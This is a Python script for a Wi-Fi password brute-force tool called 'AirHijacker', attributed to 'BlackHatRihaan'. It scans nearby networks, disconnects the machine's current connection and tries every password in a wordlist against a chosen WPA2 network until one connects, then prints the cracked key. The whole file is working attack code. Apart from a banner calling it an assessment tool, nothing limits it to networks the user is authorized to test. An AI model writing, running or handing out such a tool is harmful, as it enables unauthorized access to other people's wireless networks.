import time
import pywifi
from pywifi import const, Profile
import os
from colorama import Fore, Style, init

init(autoreset=True)

def show_banner():
    print(Fore.GREEN + Style.BRIGHT + r"""
          
   ░███    ░██            ░██     ░██ ░██  ░██                       ░██                           
  ░██░██                  ░██     ░██                                ░██                           
 ░██  ░██  ░██░██░████    ░██     ░██ ░██  ░██  ░██████    ░███████  ░██    ░██ ░███████  ░██░████ 
░█████████ ░██░███        ░██████████ ░██  ░██       ░██  ░██    ░██ ░██   ░██ ░██    ░██ ░███     
░██    ░██ ░██░██         ░██     ░██ ░██  ░██  ░███████  ░██        ░███████  ░█████████ ░██      
░██    ░██ ░██░██         ░██     ░██ ░██  ░██ ░██   ░██  ░██    ░██ ░██   ░██ ░██        ░██      
░██    ░██ ░██░██         ░██     ░██ ░██  ░██  ░█████░██  ░███████  ░██    ░██ ░███████  ░██      
                                        ░██░██                                                     
                                                    
                                                                                                   
""" + Style.RESET_ALL)

    print(Fore.CYAN + Style.BRIGHT + """
────────────────────────────────────────────────────────
   AirHijacker | Wireless Security Assessment Tool
   Mode        : Active Wi-Fi Attack Simulation
   Author      : BlackHatRihaan 💀
────────────────────────────────────────────────────────
""" + Style.RESET_ALL)

def show_help():
    print("""
    Commands:
    - help   : Show this help menu
    - scan   : Scan for nearby Wi-Fi networks
    - attack : Start brute-force attack
    """)

def scan_wifi():
    print("Scanning for nearby Wi-Fi networks...")
    wifi = pywifi.PyWiFi()
    iface = wifi.interfaces()[0]
    iface.scan()
    time.sleep(3)
    scan_results = iface.scan_results()
    
    networks.clear()  
    unique_ssids = set()
    
    print(Fore.YELLOW + "\nAvailable Wi-Fi Networks:" + Style.RESET_ALL)
    for i, network in enumerate(scan_results, start=1):
        ssid = network.ssid
        if ssid and ssid not in unique_ssids:
            unique_ssids.add(ssid)
            networks[i] = ssid  
            print(Fore.GREEN + f"{i}. {ssid}" + Style.RESET_ALL)

def disconnect_wifi(iface):
    iface.disconnect()
    time.sleep(2)
    print("Disconnected from current Wi-Fi.")
    time.sleep(1)
    print("Attack Started")
    

def try_connect(iface, ssid, password):
    profile = Profile()
    profile.ssid = ssid
    profile.auth = const.AUTH_ALG_OPEN
    profile.akm.append(const.AKM_TYPE_WPA2PSK)
    profile.cipher = const.CIPHER_TYPE_CCMP 
    profile.key = password
    
    iface.remove_all_network_profiles()
    temp_profile = iface.add_network_profile(profile)
    
    iface.connect(temp_profile)
    time.sleep(5)
    if iface.status() == const.IFACE_CONNECTED:
        print(Fore.YELLOW + f"✅ SUCCESS! Connected to {ssid} with password: " + Style.BRIGHT + f"{password}" + Style.RESET_ALL)
        return True
    else:
        return False

def brute_force(ssid, wordlist_path):
    wifi = pywifi.PyWiFi()
    iface = wifi.interfaces()[0]
    disconnect_wifi(iface)
    
    if not os.path.exists(wordlist_path):
        print(Fore.YELLOW + "⚠️ Wordlist not found. Using default: password.txt" + Style.RESET_ALL)
        wordlist_path = "Defualt-Password.txt"
    
    with open(wordlist_path, "r") as file:
        attempt_count = 0
        for password in file:
            password = password.strip()
            color = Fore.GREEN if (attempt_count // 3) % 2 == 0 else Fore.RED
            print(color + f"🔍 Trying password: {password}" + Style.RESET_ALL)
            attempt_count += 1
            
            if try_connect(iface, ssid, password):
                return
    
    print(Fore.YELLOW + "❌ Brute-force attack failed. No password worked." + Style.RESET_ALL)

networks = {}

def main():
    show_banner()
    
    while True:
        command = input("\nEnter command (type 'help' for options): ").strip().lower()
        
        if command == "help":
            show_help()
        elif command == "scan":
            scan_wifi()
        elif command == "attack":
            if not networks:
                print(Fore.YELLOW + "⚠️ No networks available. Please scan first." + Style.RESET_ALL)
                continue

            print("\nAvailable Wi-Fi Networks:")
            for key, ssid in networks.items():
                print(Fore.GREEN + f"{key}. {ssid}" + Style.RESET_ALL)
            
            try:
                choice = int(input("Enter the number of the Wi-Fi network to attack: ").strip())  
            except ValueError:
                print(Fore.YELLOW + "❌ Invalid input. Please enter a number." + Style.RESET_ALL)
                continue

            if choice not in networks:
                print(Fore.YELLOW + "❌ Invalid choice. Please try again." + Style.RESET_ALL)
                continue
            
            ssid = networks[choice]  
            wordlist_path = input("Enter the path to your wordlist file (leave empty for default): ").strip()
            if not wordlist_path:
                wordlist_path = "password.txt"
            
            brute_force(ssid, wordlist_path)
        else:
            print(Fore.YELLOW + "❌ Unknown command. Type 'help' for options." + Style.RESET_ALL)

if __name__ == "__main__":
    main()
